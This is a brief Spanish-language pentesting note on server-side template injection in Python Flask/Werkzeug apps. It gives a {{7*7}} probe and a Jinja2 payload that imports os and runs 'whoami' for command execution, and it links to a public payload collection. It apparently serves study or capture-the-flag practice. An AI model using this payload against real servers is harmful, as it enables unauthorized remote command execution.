-- - 
Siempre que vemos que esta corriendo python de fondo, flask o werkzeug hay que probar el siguiente payload:
{{7\*7 }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }} --> payload usado para ejecutar comandos.
Si nos devuelve el resultado es porque definitivamente es vulnerable.
https://github.com/swisskyrepo/PayloadsAllTheThings --> todo tipo de payloads.